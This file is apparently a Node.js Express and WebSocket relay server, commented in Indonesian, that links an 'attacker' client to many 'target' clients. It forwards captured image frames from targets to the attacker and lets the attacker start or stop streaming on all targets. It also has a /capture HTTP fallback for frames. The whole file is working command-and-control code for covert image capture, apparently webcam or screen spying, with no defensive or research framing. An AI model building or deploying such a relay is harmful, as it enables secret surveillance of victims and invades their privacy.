// ============================================================
// SERVER PERANTARA (Node.js + Express + WebSocket)
// Untuk komunikasi nyata antara target dan pelaku
// ============================================================

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Penyimpanan client
const clients = {
    attacker: null,
    targets: []
};

// ============================================================
// WEBSOCKET HANDLER
// ============================================================
wss.on('connection', (ws, req) => {
    console.log('[WS] Client terhubung:', req.socket.remoteAddress);

    // Kirim ID unik ke client
    const clientId = Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    ws.send(JSON.stringify({ type: 'init', clientId }));

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.type === 'register_attacker') {
                clients.attacker = ws;
                console.log('[WS] Attacker terdaftar');
                broadcastToTargets({ type: 'attacker_online' });
            }
            
            else if (data.type === 'register_target') {
                clients.targets.push(ws);
                console.log('[WS] Target terdaftar, total:', clients.targets.length);
                if (clients.attacker) {
                    clients.attacker.send(JSON.stringify({ 
                        type: 'target_online', 
                        targetId: data.targetId || 'TARGET-001' 
                    }));
                }
            }
            
            else if (data.type === 'frame' && clients.attacker) {
                // Relay frame dari target ke attacker
                clients.attacker.send(JSON.stringify({
                    type: 'frame',
                    image: data.image,
                    timestamp: data.timestamp,
                    targetId: data.targetId
                }));
            }
            
            else if (data.type === 'stop_stream') {
                // Hentikan semua target
                clients.targets.forEach(t => {
                    t.send(JSON.stringify({ type: 'stop' }));
                });
            }
            
            else if (data.type === 'request_stream') {
                // Minta target untuk mulai kirim frame
                clients.targets.forEach(t => {
                    t.send(JSON.stringify({ type: 'start_stream' }));
                });
            }
        } catch (e) {
            console.error('[WS] Error parsing:', e.message);
        }
    });

    ws.on('close', () => {
        console.log('[WS] Client putus');
        // Hapus dari daftar
        if (clients.attacker === ws) clients.attacker = null;
        clients.targets = clients.targets.filter(t => t !== ws);
    });
});

// ============================================================
// BROADCAST HELPER
// ============================================================
function broadcastToTargets(data) {
    clients.targets.forEach(t => {
        if (t.readyState === WebSocket.OPEN) {
            t.send(JSON.stringify(data));
        }
    });
}

// ============================================================
// STATIC FILES
// ============================================================
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Endpoint untuk menerima frame via HTTP (fallback)
app.post('/capture', (req, res) => {
    const { image, timestamp, targetId } = req.body;
    if (clients.attacker && clients.attacker.readyState === WebSocket.OPEN) {
        clients.attacker.send(JSON.stringify({
            type: 'frame',
            image: image,
            timestamp: timestamp,
            targetId: targetId
        }));
    }
    res.json({ status: 'ok' });
});

// ============================================================
// START SERVER
// ============================================================
const PORT = 9999;
server.listen(PORT, () => {
    console.log(`
    ═══════════════════════════════════════════
    🔰 HAZ SERVER AKTIF
    ═══════════════════════════════════════════
    🌐 HTTP:   http://localhost:${PORT}
    🔌 WebSocket: ws://localhost:${PORT}
    
    📁 Buka attacker.html dan target.html
    ═══════════════════════════════════════════
    `);
});